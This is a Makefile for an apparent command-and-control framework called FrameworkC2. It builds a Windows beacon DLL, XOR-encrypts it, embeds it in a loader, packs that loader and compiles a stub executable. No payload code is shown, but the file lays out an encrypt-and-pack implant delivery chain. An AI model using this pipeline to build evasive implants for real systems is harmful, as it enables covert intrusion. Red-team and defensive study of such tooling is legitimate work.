# =============================================
# Makefile — FrameworkC2 Build Pipeline
# Compiles beacon, loader, and packer in order
# =============================================

# Paths
TARGET_DIR    = target/x86_64-pc-windows-gnu/release
BEACON_DLL    = $(TARGET_DIR)/beacon.dll
LOADER_DLL    = $(TARGET_DIR)/loader.dll
BEACON_ENC    = beacon.dll.enc
STUB_EXE      = stub.exe

# Tools
CARGO         = cargo
PYTHON        = python3
XOR_ENCRYPT   = tools/xor_encrypt.py
PACK_TOOL     = pacpac/tools/pack.py

# Default target
all: $(STUB_EXE)
	@echo ""
	@echo "Build complete!"
	@echo "  - Beacon:  $(BEACON_DLL)"
	@echo "  - Loader:  $(LOADER_DLL)"
	@echo "  - Stub:    $(STUB_EXE)"

# Step 1: Build beacon DLL
$(BEACON_DLL):
	@echo "[1/5] Building beacon..."
	$(CARGO) build --package beacon --release

# Step 2: Encrypt beacon
$(BEACON_ENC): $(BEACON_DLL)
	@echo "[2/5] Encrypting beacon..."
	$(PYTHON) $(XOR_ENCRYPT) $(BEACON_DLL) $(BEACON_ENC)

# Step 3: Build loader (depends on encrypted beacon being ready)
$(LOADER_DLL): $(BEACON_ENC)
	@echo "[3/5] Building loader..."
	$(CARGO) build --package loader --release

# Step 4 & 5: Pack loader and build stub
$(STUB_EXE): $(LOADER_DLL)
	@echo "[4/5] Packing loader..."
	cd pacpac && $(PYTHON) tools/pack.py ../$(LOADER_DLL)
	@echo "[5/5] Building stub..."
	$(MAKE) -C pacpac clean
	$(MAKE) -C pacpac

# Clean everything
clean:
	@echo "Cleaning..."
	$(CARGO) clean
	rm -f $(BEACON_ENC)
	rm -f $(STUB_EXE)
	$(MAKE) -C pacpac clean

# Clean only artifacts (keep cargo cache)
clean-artifacts:
	@echo "Cleaning artifacts..."
	rm -f $(BEACON_ENC)
	rm -f $(STUB_EXE)
	$(MAKE) -C pacpac clean

# Rebuild everything from scratch
rebuild: clean all

# Build beacon only
beacon: $(BEACON_DLL)

# Build up to encrypted beacon
encrypt: $(BEACON_ENC)

# Build up to loader
loader: $(LOADER_DLL)

# Show help
help:
	@echo "FrameworkC2 Build System"
	@echo ""
	@echo "Targets:"
	@echo "  all             - Build everything (default)"
	@echo "  beacon          - Build beacon DLL only"
	@echo "  encrypt         - Build and encrypt beacon"
	@echo "  loader          - Build beacon, encrypt, and build loader"
	@echo "  clean           - Remove all build artifacts"
	@echo "  clean-artifacts - Remove only final artifacts (keep cargo cache)"
	@echo "  rebuild         - Clean and rebuild everything"
	@echo "  help            - Show this help"

.PHONY: all clean clean-artifacts rebuild beacon encrypt loader help
